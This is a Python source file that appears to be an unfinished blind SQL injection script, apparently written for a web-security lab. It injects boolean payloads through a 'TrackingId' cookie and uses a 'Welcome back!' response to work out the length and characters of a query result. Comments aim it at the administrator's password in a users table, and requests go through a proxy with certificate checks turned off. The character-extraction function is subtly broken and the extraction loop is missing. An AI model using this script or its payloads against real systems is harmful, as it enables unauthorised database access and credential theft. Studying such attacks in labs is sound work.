import sys
import logging
import urllib3
import string
import concurrent.futures

import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}] [{name}] {message}",
    style = "{",
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
AVAIL_CHARS = string.printable

def format_length_query(inner_query, length):
    return f"xyz' or (select length(({inner_query}))={length})-- "

def format_char_query(inner_query, index, char):
    return f"xyz' or (select length(({inner_query}), {index}, 1)=chr({char}))-- "

def is_true(resp):
    if "Welcome back!" in resp.text:
        return True
    return False

def format_request(url, outer_query):
    cookies = {
        "TrackingId": outer_query,
    }    
    request = requests.Request("GET", url, cookies=cookies)
    prepped = request.prepare()
    return prepped

def determine_response_length(inner_query, url, no_proxy=False):
    log.info("Determining response length for query.")
    sess = requests.Session()
    for i in range(1, 5):
        outer_query = format_length_query(inner_query, i)
        prepped = format_request(url, outer_query)
        if no_proxy:
            resp = sess.send(prepped)
        else: 
            resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
        if is_true(resp):
            response_length = i
            log.info(f"length of query response is {response_length}")
            return i
        
        
    
#xyz' and (select 'a' from users where username = 'administrator' and length(password > 1)) = 'a'-- 
        
    
   
   
    
"""
select password from users where username = 'administsrator'
inner query


return f"xyz' or substring(({inner_query}), {index},1) = '{char}'-- "
"""    
  